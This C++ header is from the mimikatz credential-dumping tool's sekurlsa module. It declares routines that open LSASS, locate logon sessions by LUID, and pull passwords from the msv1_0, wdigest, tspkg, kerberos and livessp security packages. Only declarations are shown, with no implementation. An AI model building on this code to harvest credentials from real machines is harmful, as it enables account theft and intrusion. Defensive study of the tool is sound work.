/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
*/
#pragma once
#include "globdefs.h"
#include "mod_memory.h"
#include "mod_process.h"
#include "mod_text.h"
#include "mod_system.h"
#include <iostream>
#include "secpkg.h"

#include "Security Packages/msv1_0.h"
#include "Security Packages/tspkg.h"
#include "Security Packages/wdigest.h"
#include "Security Packages/kerberos.h"
#include "Security Packages/livessp.h"

class mod_mimikatz_sekurlsa
{
public:
	typedef bool (WINAPI * PFN_ENUM_BY_LUID) (__in PLUID logId, __in bool justSecurity);
private:
	typedef struct _KIWI_BCRYPT_KEY_DATA {
		DWORD size;
		DWORD type;
		PVOID unk0;
		DWORD unk1;
		DWORD unk2;
		DWORD unk3;
		DWORD size1;
		DWORD size2;	/* ... DATA*/
	} KIWI_BCRYPT_KEY_DATA, *PKIWI_BCRYPT_KEY_DATA;

	typedef struct _KIWI_BCRYPT_KEY {
		DWORD size;
		DWORD type;
		PVOID unkCallbacks;
		PKIWI_BCRYPT_KEY_DATA cle;	/* ... */
	} KIWI_BCRYPT_KEY, *PKIWI_BCRYPT_KEY;

	/* Crypto NT 5 */
	static PBYTE *g_pRandomKey, *g_pDESXKey;
	
	static bool population;
	static vector<pair<PFN_ENUM_BY_LUID, wstring>> GLOB_ALL_Providers;
	static bool getLogonPasswords(vector<wstring> * arguments);
	static PVOID getPtrFromAVLByLuidRec(PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind);
public:
	static HANDLE hLSASS;
	static HMODULE hLsaSrv;
	static mod_process::PKIWI_VERY_BASIC_MODULEENTRY pModLSASRV;
	static PLSA_SECPKG_FUNCTION_TABLE SeckPkgFunctionTable;

	static bool searchLSASSDatas();
	static PLIST_ENTRY getPtrFromLinkedListByLuid(PLIST_ENTRY pSecurityStruct, unsigned long LUIDoffset, PLUID luidToFind);
	static PVOID getPtrFromAVLByLuid(PRTL_AVL_TABLE pTable, unsigned long LUIDoffset, PLUID luidToFind);

	static wstring getUnicodeString(LSA_UNICODE_STRING * ptrString, bool isPassword = false);
	static void genericCredsToStream(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, bool justSecurity, bool isTsPkg = false);
	static bool	getLogonData(vector<wstring> * mesArguments, vector<pair<PFN_ENUM_BY_LUID, wstring>> * mesProviders);

	static bool loadLsaSrv();
	static bool unloadLsaSrv();

	static vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> getMimiKatzCommands();
};
